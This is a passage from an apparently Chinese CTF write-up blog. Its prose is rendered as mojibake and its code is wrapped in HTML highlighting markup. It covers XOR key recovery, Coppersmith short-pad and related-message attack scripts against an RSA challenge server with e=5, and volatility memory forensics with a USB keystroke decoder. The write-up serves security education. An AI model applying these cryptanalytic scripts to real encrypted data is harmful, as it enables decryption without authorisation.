‡å¿—ä½ç½®ä¸ºFalse,ä¸ä¼šå°†è¯¥asciiä½œä¸ºå¯èƒ½çš„xor_keyå­—ç¬¦</span>                <span class="token keyword">if</span> invalid<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token boolean">False</span>                    <span class="token keyword">break</span>            <span class="token comment" spellcheck="true">#å°†ç¬¦åˆæ¡ä»¶çš„asciiå¯¹åº”çš„å­—ç¬¦æ·»åŠ åˆ°å¯¹åº”xor_keyå­—ç¬¦ä½ç½®çš„åˆ—è¡¨</span>            <span class="token keyword">if</span> flag<span class="token punctuation">:</span>                t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>cand<span class="token punctuation">)</span><span class="token punctuation">)</span>        c<span class="token punctuation">.</span>append<span class="token punctuation">(</span>len<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span>        cc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">not</span> <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> c<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> cc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113163611.png" alt=""></p><p>è¿™è™½ç„¶ä¸æ˜¯æœ€ç²¾ç¡®çš„æ–¹æ³•ï¼Œä½†å¯ä»¥è¯´æ˜¯ç®€ä¾¿é«˜æ•ˆäº†ï¼Œè¿˜æœ‰å°±æ˜¯é€šè¿‡xortoolæ¥çˆ†ç ´keyçš„é•¿åº¦ï¼Œä»¥åŠå¯èƒ½çš„å­—ç¬¦ä¸²ã€‚æˆ–è€…æŸ¥çœ‹<a href="https://xz.aliyun.com/t/3256#toc-22" target="_blank" rel="noopener">æ±‰æ˜ç åŸç†</a>ã€‚</p><p>é€šè¿‡xortoolç¬é—´å¾—åˆ°keyé•¿åº¦æœ€å¯èƒ½ä¸º21ï¼ˆè®°å¾—å¯†æ–‡éœ€è¦æ˜¯base64è§£å¯†åçš„çœŸæ­£å†…å®¹ï¼‰ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113170451.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113172004.png" alt=""></p><p>çš„ç¡®å¯ä»¥çœ‹åˆ°çˆ†ç ´å‡ºæ¥çš„keyå¤§å¤šæ•°ä¸æˆå½¢ï¼Œæ¯”è¾ƒéš¾çŒœå‡ºï¼Œä¸è¿‡å¾—åˆ°äº†keyçš„é•¿åº¦å°±æ¯”è¾ƒç®€å•äº†ã€‚</p><h3 id="crypto2-Xor-RSA"><a href="#crypto2-Xor-RSA" class="headerlink" title="crypto2 - Xor?RSA"></a>crypto2 - Xor?RSA</h3><blockquote><p>è¿™é¢˜æ¶‰åŠåˆ°RSAçš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼špaddingè¿‡çŸ­ï¼Œå¯ä»¥åˆ©ç”¨Coppersmithâ€™s short-pad attackã€‚</p><p><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">CTFä¸­RSAå¸¸è§æ”»å‡»æ–¹æ³•</a></p><p><a href="https://www.anquanke.com/post/id/158944" target="_blank" rel="noopener">æµ…æRSA Padding Attack-ä¸€å¶é£˜é›¶</a></p><p>é¢˜ç›®æºç ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> SocketServer<span class="token keyword">import</span> string<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> random<span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> flag <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">class</span> <span class="token class-name">ThreadedTCPServer</span><span class="token punctuation">(</span>SocketServer<span class="token punctuation">.</span>ThreadingMixIn<span class="token punctuation">,</span> SocketServer<span class="token punctuation">.</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">RSATCPHandler</span><span class="token punctuation">(</span>SocketServer<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"Welcome to flag getting system\ngive me your token > "</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> verify<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"token error\n"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            p <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            q <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            n <span class="token operator">=</span> p <span class="token operator">*</span> q            e <span class="token operator">=</span> <span class="token number">5</span>            nbits <span class="token operator">=</span> size<span class="token punctuation">(</span>n<span class="token punctuation">)</span>            kbits <span class="token operator">=</span> nbits <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> e <span class="token operator">*</span> e<span class="token punctuation">)</span>            m1 <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span>nbits<span class="token punctuation">)</span>            m2 <span class="token operator">=</span> m1 <span class="token operator">^</span> getRandomNBitInteger<span class="token punctuation">(</span>kbits<span class="token punctuation">)</span>            c1 <span class="token operator">=</span> pow<span class="token punctuation">(</span>m1<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            c2 <span class="token operator">=</span> pow<span class="token punctuation">(</span>m2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"n="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"c1="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>c1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"c2="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>c2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"now give me you answer\n"</span><span class="token punctuation">)</span>            ans1 <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            ans2 <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> str<span class="token punctuation">(</span>ans1<span class="token punctuation">)</span> <span class="token operator">==</span> str<span class="token punctuation">(</span>m1<span class="token punctuation">)</span> <span class="token operator">and</span> str<span class="token punctuation">(</span>ans2<span class="token punctuation">)</span> <span class="token operator">==</span> str<span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"wrong answer\n"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    HOST<span class="token punctuation">,</span> PORT <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">10086</span>    server <span class="token operator">=</span> ThreadedTCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">,</span> RSATCPHandler<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113173105.png" alt=""></p><p>è¿™ç§ç›®å‰æ¯”è¾ƒå¸¸è§çš„å¯†ç å­¦å‡ºé¢˜æ–¹å¼ï¼Œä¹‹å‰ä¸Šæµ·ç¬¬å››å±Šå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨ç«èµ›ä¸­ä¹Ÿæ˜¯ç±»ä¼¼çš„å½¢å¼ã€‚</p><p>æ ¹æ®ç½‘ä¸ŠCoppersmithâ€™s short-pad attackçš„sageè„šæœ¬è®¡ç®—å¾—åˆ°m1,m2ä»è€Œgetflag:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#.sageæ–‡ä»¶</span><span class="token keyword">def</span> <span class="token function">short_pad_attack</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PRxy<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    PRx<span class="token punctuation">.</span><span class="token operator">&lt;</span>xn<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    PRZZ<span class="token punctuation">.</span><span class="token operator">&lt;</span>xz<span class="token punctuation">,</span>yz<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> x<span class="token operator">^</span>e <span class="token operator">-</span> c1    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2    q1 <span class="token operator">=</span> g1<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRZZ<span class="token punctuation">)</span>    q2 <span class="token operator">=</span> g2<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRZZ<span class="token punctuation">)</span>    h <span class="token operator">=</span> q2<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>q1<span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRx<span class="token punctuation">)</span><span class="token punctuation">.</span>subs<span class="token punctuation">(</span>y<span class="token operator">=</span>xn<span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    kbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>e<span class="token operator">*</span>e<span class="token punctuation">)</span>    diff <span class="token operator">=</span> h<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^kbits with factor >= n^0.5</span>    <span class="token keyword">return</span> diff<span class="token keyword">def</span> <span class="token function">related_message_attack</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PRx<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> x<span class="token operator">^</span>e <span class="token operator">-</span> c1    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>diff<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2    <span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> g2<span class="token punctuation">:</span>            g1<span class="token punctuation">,</span> g2 <span class="token operator">=</span> g2<span class="token punctuation">,</span> g1 <span class="token operator">%</span> g2        <span class="token keyword">return</span> g1<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>gcd<span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    n<span class="token operator">=</span> <span class="token number">27624787021478794432014046099044118472227462806689571877169321162341080400196594346396848700712193861439412465401252070834347447700123908992634057384897412386580543011772079685187452484482547314927927429951393092826148514141421284117787379461959985518410275689835704614842539327338694334290636840780333631465334614621493439746492265763855548204271205728089432042119353912134654280030097883942195750158943707581611175683875993347872617178472015419336030838097558714715441536192198290146161340547436590517299418585354071449344756659404775888056026765078595754225196944721648716610489001136659404706431278525745515104917</span>    c1<span class="token operator">=</span> <span class="token number">13776430024099427642531911099839128926564176154051949185623735493234122290060192171769692779077048350629609066059365476450358845203910684337231957918278447357520403549804467122983129527704870697355281794028641080624088689157548661997693776511974828120568864171878093764082280753662161625828078814197217819685649535298124739243813838247280440444870641299263032971398100048924255763139678843914805922076507098230791386720957494918572285270985306870181291182419426387424133256438320963476729846690659232164905237954666457813107525668584308246667410713493861547967072360028087639069471098558962062807871564380753429263871</span>    c2<span class="token operator">=</span> <span class="token number">657231109479430507699610101563647841801217640396116098068091897995892991211353444343972272978841494609004887673387698097902809034155415900362766044097098144261124986944336934366572328336651114328263543752730621658631527529933155522273669604895074397446129985885649878307733042032148247389310416198437240727964021932669979819481020837218701471923646557509580811764880281874944153918428434725834087434372596746861333346978776952856870040789444689376922826142208442257560964199238714914125845958146653319252684895614435672435449705706009355823637834574529488498832642357882290037365904913250435342395978044581644541358</span>    e <span class="token operator">=</span> <span class="token number">5</span>    diff <span class="token operator">=</span> short_pad_attack<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"difference of two messages is %d"</span> <span class="token operator">%</span> diff    m1 <span class="token operator">=</span> related_message_attack<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m2 <span class="token operator">=</span> m1 <span class="token operator">+</span> diff    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> m1    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> pow<span class="token punctuation">(</span>m1<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span> c1    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> m2    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> pow<span class="token punctuation">(</span>m2<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span> c2</code></pre><p>sageç¯å¢ƒå¯ä»¥è‡ªå·±å®‰è£…ï¼Œä¹Ÿå¯ä»¥åœ¨çº¿è¿è¡Œï¼š<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">https://sagecell.sagemath.org/</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><blockquote><p>è¿™å‡ é“miscæ„Ÿè§‰ä¹Ÿå§¿åŠ¿æ»¡æ»¡å‘¢ã€‚æ¯”å¦‚å†…å­˜å–è¯ï¼Œusbæµé‡åˆ†æã€‚</p></blockquote><h3 id="eazy-dump"><a href="#eazy-dump" class="headerlink" title="eazy_dump"></a>eazy_dump</h3><p>é¦–å…ˆéœ€è¦çŸ¥é“è¿™æ˜¯ä¸€ä¸ªé•œåƒæ–‡ä»¶ï¼Œè€Œkaliä¸‹é¢çš„volatilityå¯ä»¥è¿›è¡Œå†…å­˜å–è¯ï¼Œå¯ä»¥å‚è€ƒè¿™ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://www.jianshu.com/p/6438bc3302c8" target="_blank" rel="noopener">CTFå†…å­˜å–è¯</a></p><p>æ‰§è¡Œå‘½ä»¤<code>volatility -f mem.data imageinfo</code>å¯ä»¥çœ‹åˆ°é•œåƒä¿¡æ¯ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113205904.png" alt=""></p><p><code>volatility -f mem.data --profile=Win2008R2SP0x64 pslist</code>æŸ¥çœ‹è¿›ç¨‹ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113210854.png" class="lazyload"></p><p><code>**volatility -f mem.data --profile=Win2008R2SP0x64 -p [PID] -D [dump å‡ºçš„æ–‡ä»¶ä¿å­˜çš„ç›®å½•]**</code>å¯¼å‡ºæŒ‡å®šè¿›ç¨‹æ•°æ®ï¼š</p><p>gimpå¯ä»¥è¯»å–.dataæ–‡ä»¶ï¼Œä»åŸå§‹æ•°æ®ä¸­è½½å…¥å›¾åƒï¼ˆéœ€è¦æ³¨æ„è°ƒæ•´çš„æ˜¯å®½åº¦ï¼Œè¿™ä¸ªæœ€é‡è¦ï¼Œå½“å®½åº¦ä¸º1457æ—¶æœ€æ¥è¿‘åŸå›¾ï¼Œç„¶åè¶Šå¤§å°±è¶Šä¸å®¹æ˜“æ‰¾åˆ°ï¼‰ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113214227.png" class="lazyload"></p><h3 id="difficult-programming-language"><a href="#difficult-programming-language" class="headerlink" title="difficult programming language"></a>difficult programming language</h3><p>é€šè¿‡æå–å¹¶ä¸”è§£å¯†usbæµé‡å¯ä»¥å¾—åˆ°ä¸€æ®µ malbolge çš„ä»£ç ï¼Œä¹‹å‰åœ¨ä¸­ç§‘å¤§æ ¡èµ›ä¸Šé¢ä¹Ÿåšè¿‡ğŸ˜„ã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113205419.png" class="lazyload"></p><p>ç„¶åå¯ä»¥googleä¸Šé¢æœä¸ªç¼–è¯‘å™¨è¿è¡Œä¸€ä¸‹ï¼Œä¸åŒçš„ç¼–è¯‘å™¨æ•ˆæœå¯èƒ½ä¸ä¸€æ ·ï¼Œæœ‰å¯èƒ½è¿™ä¸ªç¼–è¯‘å™¨æœ‰ç”¨ï¼Œå¦å¤–ä¸€ä¸ªæ²¡ç”¨ã€‚ã€‚</p><p>usbdecode.py:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#linux python2</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> osDataFileName <span class="token operator">=</span> <span class="token string">"usb.dat"</span>presses <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>normalKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"&lt;TAB>"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"`"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token 